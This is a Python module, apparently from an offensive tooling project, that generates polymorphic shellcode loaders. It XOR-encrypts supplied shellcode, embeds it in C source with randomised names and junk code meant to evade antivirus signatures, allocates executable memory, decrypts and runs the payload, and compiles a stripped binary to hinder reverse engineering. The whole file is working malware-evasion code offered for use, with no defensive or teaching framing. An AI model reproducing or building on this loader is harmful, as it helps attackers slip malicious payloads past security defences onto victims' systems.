import os
import random
import string
import subprocess
import hashlib
from typing import Tuple

class PolymorphicFactory:
    """
    Sprint 16: Polymorphic Loader Generator.
    Creates unique, signature-evading binaries by mutating C source code.
    """
    
    def __init__(self):
        self.output_dir = "targets/payloads"
        if not os.path.exists(self.output_dir):
            os.makedirs(self.output_dir)

    def _random_string(self, length=8) -> str:
        """Generate a random variable name (C-compatible)."""
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

    def _generate_junk_code(self) -> str:
        """
        Generates 'Dead Code' - useless math that changes the binary signature
        but does not affect execution logic.
        """
        v1 = self._random_string(4)
        v2 = self._random_string(4)
        ops = ["+", "-", "*", "^"]
        op = random.choice(ops)
        val = random.randint(1, 100)
        
        # Example: int abcd = 10; abcd = abcd * 5;
        return f"    volatile int {v1} = {val}; {v1} = {v1} {op} {random.randint(1,50)};"

    def _xor_encode(self, data: bytes) -> Tuple[str, int]:
        """
        Encrypts the shellcode with a random byte key.
        Returns (C-formatted byte array, key).
        """
        key = random.randint(1, 255)
        encoded = [b ^ key for b in data]
        # Format as C array: { 0x90, 0xAB, ... }
        c_array = "{ " + ", ".join([f"0x{b:02x}" for b in encoded]) + " }"
        return c_array, key

    def generate_loader(self, shellcode: bytes, output_name="loader") -> str:
        """
        1. Encrypt Shellcode.
        2. Generate Randomized C Source.
        3. Compile to Binary.
        4. Return Path.
        """
        print(f"[POLY] Generating polymorphic loader for {len(shellcode)} bytes...")
        
        # 1. Prepare Payload
        c_payload, key = self._xor_encode(shellcode)
        payload_var = self._random_string(6)
        key_var = self._random_string(5)
        counter_var = self._random_string(1)
        
        # 2. Construct C Source (The Template)
        # We inject random variable names and junk code
        c_source = f"""
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

// Obfuscated Loader
int main() {{
{self._generate_junk_code()}
    
    // Encrypted Payload
    unsigned char {payload_var}[] = {c_payload};
    unsigned char {key_var} = {key};
    
{self._generate_junk_code()}

    // Allocate Executable Memory
    void *exec_mem = mmap(0, sizeof({payload_var}), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    
    // Decrypt (XOR)
    for (int {counter_var} = 0; {counter_var} < sizeof({payload_var}); {counter_var}++) {{
        ((unsigned char*)exec_mem)[{counter_var}] = {payload_var}[{counter_var}] ^ {key_var};
    }}
    
{self._generate_junk_code()}

    // Jump to Shellcode
    void (*func)() = (void (*)())exec_mem;
    func();
    
    return 0;
}}
"""
        # 3. Write Source File
        src_path = os.path.join(self.output_dir, f"{output_name}.c")
        bin_path = os.path.join(self.output_dir, f"{output_name}.bin")
        
        with open(src_path, "w") as f:
            f.write(c_source)
            
        # 4. Compile (Using gcc)
        # -s strips symbols (smaller size, harder to reverse)
        try:
            cmd = f"gcc {src_path} -o {bin_path} -s -no-pie"
            subprocess.check_output(cmd, shell=True)
            print(f"[POLY] Compilation success: {bin_path}")
            return bin_path
        except subprocess.CalledProcessError as e:
            print(f"[POLY] Compilation Failed: {e}")
            return None